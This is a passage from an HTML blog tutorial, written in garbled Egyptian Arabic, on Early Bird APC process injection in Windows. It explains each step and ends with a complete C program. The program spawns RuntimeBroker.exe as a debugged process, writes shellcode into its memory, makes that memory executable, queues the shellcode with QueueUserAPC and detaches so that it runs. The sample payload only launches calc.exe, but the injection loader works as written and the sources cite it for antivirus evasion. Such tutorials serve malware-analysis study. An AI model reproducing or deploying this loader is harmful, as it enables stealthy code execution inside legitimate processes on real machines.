                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-6.png" alt="APC-Injection-17" class="article-image"
                            loading="lazy">
                    </div>
                </ol>
                <p style="border-top: 2px solid gold;"></p>
                <p style="font-weight: bold;">[+] ุชุนุงูู ูุฏุฎู ุน ุงูููุฏ :</p>
                <ol>
                    <li>ุฏุง ุนุดุงู ูุชุบุงุถู ุนู ุงูุฅูุฑูุฑ ุจุชุงุน ุงูู <code
                            style="background: gold; font-size: 14px;">sprintf</code> .. ูุงุชููููุง ุนููุง ูู ุงูููุงูุงุช ุงููู
                        ูุงุชุช ูู ูุงูุฑ.</li>
                    <li>ุฏุง ุชุนุฑูู ููู ุจุฑูุณูุณ ุงููู ููุดุชุบู ุนูููุง ููุณุชูุฏููููุง.</li>
                    <li>ููุณ ุงูุดูู ููุฏ ุจุชุงุน ูู ูุฑุฉ.</li>
                    <li>ุฏู ุงููุงููุดู ูู ุงูููุงูุฉ ุงููู ูุงุชุช ุจุชุงุนุฉ ุงูู <code
                            style="background: gold; font-size: 14px;">Shellcode Injection</code>.</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-7.png" alt="APC-Injection-18" class="article-image"
                            loading="lazy">
                    </div>
                    <li>ูู ุงูุฎุทูุฉ ุงูุฃููู ุจูุญุชุงุฌ ูุดุบู ุจุฑูุณูุณ ูุณุชูุฏูุฉ ุ ูุงููู ูู ูู ุงููุซุงู ุจุชุงุนูุง ุฏู (RuntimeBroker.exe) ุ
                        ุจุณ ุจุทุฑููุฉ ุชุฎูููุง ูุชุญูู ูููุง ูุจู ูู ุชุดุชุบู ุจุงููุงูู .. ูุฏู ุจุงูุถุจุท ุงููู ุจุชุนููู ุงููุงููุดู
                        <code style="background: gold; font-size: 14px;">CreateDebuggedProcess</code> ุ ุฒู ูู ูุงู ูู
                        ุงูุตูุฑุฉ ุงููู ูููุง ุงูุฎุทูุงุช ุ ุฃูู ุฎุทูุฉ ูุงูุช <code style="background: gold; font-size: 14px;">CreateProcessA -
                            Debug</code> ุ ูููุง ุงูููุฏ ุจูุณุชุฎุฏู <code
                            style="background: gold; font-size: 14px;">CreateProcessA</code> ูุน <code
                            style="background: gold; font-size: 14px;">DEBUG_PROCESS</code> ุนุดุงู ูุดุบู
                        RuntimeBroker.exe ูู ูุถุน
                        ุงูุชุตุญูุญ ุ ูุฏู ุจูุฎูููุง ูุชูููุฉ ูุคูุชุง ุจุฏู ูู ุชุดุชุบู ุน ุทูู.
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-8.png" alt="APC-Injection-19" class="article-image"
                            loading="lazy">
                    </div>
                    <li>ุขุฎุฑ ุฌุฒุก ูุฏุง ุงูู <code style="background: gold; font-size: 14px;">main func</code> .. ููู ุงูุฃูู
                        ุจูุดุบู ุงูู <code style="background: gold; font-size: 14px;">CreateDebuggedProcess</code> ุนุดุงู
                        ุชููู
                        RuntimeBroker.exe
                        ูู ูุถุน ุงูู Debugging ุ ุจุนุฏ ูุฏู ุจูุชู ุญูู ุงูุดูู ููุฏ ูู ุงูุจุฑูุณูุณ ูู ุฎูุงู
                        <code style="background: gold; font-size: 14px;">InjectShellcodeToRemoteProcess</code> ุ ุจุนุฏูู
                        ุจูุณุชุฎุฏู <code style="background: gold; font-size: 14px;">QueueUserAPC</code> ุนุดุงู ููุถุงู ุงูุดูู
                        ููุฏ ููุงุฆูุฉ ุงูู APC Queue ุ ุจุญูุซ ูุชููุฐ ุน ุทูู ..
                        ุจุนุฏ ูุฏู ุจูุญุตู ุงุณุชุฆูุงู ููุจุฑูุณูุณ ุจุงุณุชุฎุฏุงู <code
                            style="background: gold; font-size: 14px;">DebugActiveProcessStop</code> ุ ุงููู ุจูุนูู
                        Detach ููู Debugger ูู ุงูุนูููุฉ ููุฎูููุง ุชุณุชูุฑ ูู ุงูุชูููุฐ ุจุดูู ุทุจูุนู ูู ุบูุฑ ุฃู ุดููู ุ ูุงุฎุฑ ุฎุทูุฉ
                        ุจูููู ุงููุงูุฏู ูุงูุช ูุฏุง ูุฏุง ุนุงุฑู ููู ูู ุงูููุงูุงุช ุงููู ูุงุชุช.
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-9.png" alt="APC-Injection-20" class="article-image"
                            loading="lazy">
                    </div>
                </ol>
                <p style="border-top: 2px solid gold;"></p>
                <p>[+] ููุง ูู ุฑู :</p>
                <ul>
                    <li>ูููุงูู ุฅูู ุงุดุชุบู ูุชูุงู โ</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-10.png" alt="APC-Injection-21" class="article-image"
                            loading="lazy">
                    </div>
                </ul>
                <p>[+] ุจุณ ุชุนุงูู ูุดูู ุชูุงุตูู ุฃูุชุฑ .. ููุดุบู ุงูุจุฑูุงูุฌ ุชุงูู ูููุชุญ ุงูู <a
                        href="https://sourceforge.net/projects/processhacker/" target="_blank"
                        class="download-link">Process Hacker</a></p>
                <ul>
                    <li>ูู ุจุญุซุช ุจู ุงุณู ุงูุจุฑูุณูุณ ูุชูุงูู ุฅู ุงููู ุนูููุงูุง ููููุง ูุฎุชูู </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-11.png" alt="APC-Injection-22" class="article-image"
                            loading="lazy">
                    </div>
                    <li>ููู ุฑูุญุช ุน <code style="background: gold; font-size: 14px;">Options > Highlighting</code> ูุชุชุฃูุฏ
                        ุฅู ุงูููู ุฏู ูุนูู ุฅููุง ูู ุงูู <code
                            style="background: gold; font-size: 14px;">Debugged Process</code>.</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-12.png" alt="APC-Injection-23" class="article-image"
                            loading="lazy">
                    </div>
                    <li>ูููุง ูุชูุงูู ุชูุงุตูู ุฒู ููู ุงูู <code style="background: gold; font-size: 14px;">Parent</code>
                        ุงููู ุดุบู ุงูุจุฑูุณูุณ ุฏู ุ <code style="background: gold; font-size: 14px;">ูุงููููุงูุฏ</code> ุงููู
                        ุงุชูุชุจ ุนุดุงู ุชุดุชุบู.
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-13.png" alt="APC-Injection-24" class="article-image"
                            loading="lazy">
                    </div>
                    <li>ูู ุฑูุญุช ุน ุงูู <code style="background: gold; font-size: 14px;">Address</code> ุ ูุชูุงูู ุฅู ุงูุดูู
                        ููุฏ ููุฌูุฏ ุจุณ ุจุตูุงุญูุงุช <code style="background: gold; font-size: 14px;">Read & Write</code> ุจุณ.
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-14.png" alt="APC-Injection-25" class="article-image"
                            loading="lazy">
                    </div>
                    <li>ููุง ูุชุถุบุท Enter .. ูุชูุงูู ุฅู <code
                            style="background: gold; font-size: 14px;">ุงูุตูุงุญูุงุช ุฅุชุบูุฑุช</code> ูุงูุดูู ููุฏ ููุฏุฑ ูุดุบูู.
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-15.png" alt="APC-Injection-26" class="article-image"
                            loading="lazy">
                    </div>
                    <li>ุขุฎุฑ ุฎุทูุฉ ูุชุถุบุท Enter ุชุงูู ุนุดุงู ุชุดุบู ุงูุดูู ููุฏ .. ูููุดุชุบู ูุงูุฏููุง ุชูุงู.</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-16.png" alt="APC-Injection-27" class="article-image"
                            loading="lazy">
                    </div>
                </ul>
                <p style="border-top: 2px solid gold;"></p>
                <p>[+] ุงูููุฏ ุงูููุงุฆู :</p>
                <div class="code-block">
                    <code>
                        #include &lt;Windows.h><br>
                            #include &lt;stdio.h><br><br>
                            
                            #pragma warning (disable:4996)<br><br>
                            
                            #define TARGET_PROCESS	"Runtimebroker.exe"<br><br>
                            
                            unsigned char Payload[] = {<br>
                            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
                            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
                            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
                            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
                            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
                            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
                            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
                            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
                            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
                            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
                            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
                            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
                            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
                            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
                            "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
                            "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
                            "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
                            "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
                            "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
                            "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"<br>
                            };<br><br>
                            
                            BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {<br><br>
                            
                                &nbsp;&nbsp;SIZE_T sNumberOfBytesWritten = NULL;<br>
                                &nbsp;&nbsp;DWORD dwOldProtection = NULL;<br><br>
                            
                                &nbsp;&nbsp;*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                                &nbsp;&nbsp;if (*ppAddress == NULL) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;}<br>
                                    &nbsp;&nbsp;printf("\n[i] Allocated Memory At : 0x%p \n", *ppAddress);<br><br>
                            
                                    &nbsp;&nbsp;if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("\n[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                        &nbsp;&nbsp;}<br>
                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to write the Shellcode ... \n");<br>
                                        &nbsp;&nbsp;getchar();<br>
                                        &nbsp;&nbsp;printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);<br><br>
                            
                                        &nbsp;&nbsp;if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                            &nbsp;&nbsp;}<br><br>
                            
                                            &nbsp;&nbsp;return TRUE;<br>
                            }<br><br>
                            
                            BOOL CreateDebuggedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {<br><br>
                            
                                &nbsp;&nbsp;CHAR lpPath	[MAX_PATH * 2];<br>
                                &nbsp;&nbsp;CHAR WnDr [MAX_PATH];<br><br>
                            
                                &nbsp;&nbsp;STARTUPINFO	Si = { 0 };<br>
                                &nbsp;&nbsp;PROCESS_INFORMATION	Pi = { 0 };<br><br>
                            
                                &nbsp;&nbsp;RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));<br>
                                &nbsp;&nbsp;RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));<br><br>
                            
                                &nbsp;&nbsp;Si.cb = sizeof(STARTUPINFO);<br><br>
                                
                                &nbsp;&nbsp;if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;}<br><br>
                            
                                    &nbsp;&nbsp;sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);<br>
                                    &nbsp;&nbsp;printf("\n[i] Running : \"%s\" ... ", lpPath);<br>
                            
                                    &nbsp;&nbsp;if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                        &nbsp;&nbsp;}<br><br>
                            
                                        &nbsp;&nbsp;printf("[+] DONE \n");<br><br>
                            
                                        &nbsp;&nbsp;*dwProcessId = Pi.dwProcessId;<br>
                                        &nbsp;&nbsp;*hProcess = Pi.hProcess;<br>
                                        &nbsp;&nbsp;*hThread = Pi.hThread;<br><br>
                            
                                        &nbsp;&nbsp;if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return TRUE;<br><br>
                                
                                        &nbsp;&nbsp;return FALSE;<br>
                            }<br><br>
                            
                            int main() {<br><br>
                                
                                &nbsp;&nbsp;HANDLE	hProcess = NULL, hThread = NULL;<br>
                                &nbsp;&nbsp;DWORD dwProcessId = NULL;<br>
                                &nbsp;&nbsp;PVOID pAddress = NULL;<br><br>
                            
                                &nbsp;&nbsp;printf("[i] Creating \"%s\" Process as a Debugged Process ... \n", TARGET_PROCESS);<br><br>
                            
                                &nbsp;&nbsp;if (!CreateDebuggedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                    &nbsp;&nbsp;}<br>
                                    &nbsp;&nbsp;printf("[i] Target Process Created With Pid : %d \n", dwProcessId);<br>
                                    &nbsp;&nbsp;printf("[+] DONE \n\n");<br><br>
                            
                                    &nbsp;&nbsp;printf("[i] Injecting Shellcode to the Target Process ... \n");<br>
                                    &nbsp;&nbsp;if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                        &nbsp;&nbsp;}<br>
                                        &nbsp;&nbsp;printf("[+] DONE \n\n");<br><br>
                            
                            
                                        &nbsp;&nbsp;QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);<br><br>
                            
                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Run the Shellcode ... \n");<br>
                                        &nbsp;&nbsp;getchar();<br><br>
                            
                                        &nbsp;&nbsp;DebugActiveProcessStop(dwProcessId);<br><br>
                            
                                        &nbsp;&nbsp;printf("[+] DONE \n\n");<br><br>
                            
                                        &nbsp;&nbsp;CloseHandle(hProcess);<br>
                                        &nbsp;&nbsp;CloseHandle(hThread);<br><br>
                            
                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ... \n");<br>
                                        &nbsp;&nbsp;getchar();<br><br>
                            
                                        &nbsp;&nbsp;return 0;<br>
                            }<br>
                    </code>
                </div>

                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p>ูุจูุฏุง . ุฃุชููู ุชููู ุงุณุชูุฏุช ุญุงุฌู .. ูููุชูู ูู ููุงูุฉ ูุงุฏูุฉ .. ููู ุนูุฏู ุฃู ุชุนููู ุ ุงุณุชูุณุงุฑ ุ ุฃู ุญุงุฌู ..
                    ูุชุชุฑุฏุฏุด ูููููู.<br>
                    ูุงุจูู ุฅุฏุนููู ุนุดุงู ุฏุงุฎู ุงูุฌูุด ุงููุชุฑู ุงูุฌุงูุฉ .. ูุตุตุตุตุฑ ูุญุชุงุฌุงูู :(</p>
            </div>
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
                <h2>References</h2>
                <p>ุฎุฏูู ููุฉ ูู ุงููุตุงุฏุฑ ูุงููุฑุงุฌุน ูุง ุนุฒูุฒู:</p>

                <ul style="direction: ltr;">
                    <li><a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls"
                            target="_blank" class="download-link">Asynchronous Procedure Calls</a>

                    <li><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1055-process-injection/asynchronous-procedure-call"
                            target="_blank" class="download-link">Asynchronous Procedure Call</a></li>

                    <li><a href="https://attack.mitre.org/techniques/T1055/004/" target="_blank"
                            class="download-link">Process Injection: Asynchronous Procedure Call</a></li>

                    <li><a href="https://aliongreen.github.io/posts/apc-injection.html" target="_blank"
                            class="download-link">Process Injection: APC Injection</a></li>

                    <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection"
                            target="_blank" class="download-link">APC Queue Code Injection</a></li>

                    <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection"
                            target="_blank" class="download-link">Early Bird APC Queue Code Injection</a></li>

                    <li><a href="https://github.com/Faran-17/EarlyBird-APC-Injection" target="_blank"
                            class="download-link">EarlyBird-APC-Injection Code</a></li>

                    <li><a href="https://chrollo-dll.gitbook.io/chrollo/security-blogs/malware-development-and-ttps/early-bird-apc-injection-t1055.004"
                            target="_blank" class="download-link">Early Bird APC Injection - T1055.004</a></li>


                    <li><a href="https://www.linkedin.com/pulse/av-evasion-early-bird-code-injection-ralph-el-khoury/"
                            target="_blank" class="download-link">Evasion with Early Bird Injection</a></li>

                </ul>
            </div>
            <div class="nav-buttons">
                <a href="#" onclick="nextArticle()" style="direction: ltr;">Next โ</a>
                <a href="./Shellcode-Injection.html" onclick="previousArticle()" style="direction: ltr;">โ Previous</a>
            </div>
    </section>
    <footer class="footer" data-aos="zoom-in" data-aos-duration="800" style="direction: ltr;">
        <p>&copy; <span id="year"></span> <a href="https://0x4de1.github.io">0x4de1</a>. All rights reserved.</p>
    </footer>

    <script src="../src/JS/script.js"></script>
    <script src="https://unpkg.com/aos@next/dist/aos.js" defer></script>
    <script>
        window.onload = function () {
            AOS.init({ offset: 0 });
        };
    </script>
    <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
</body>

</html>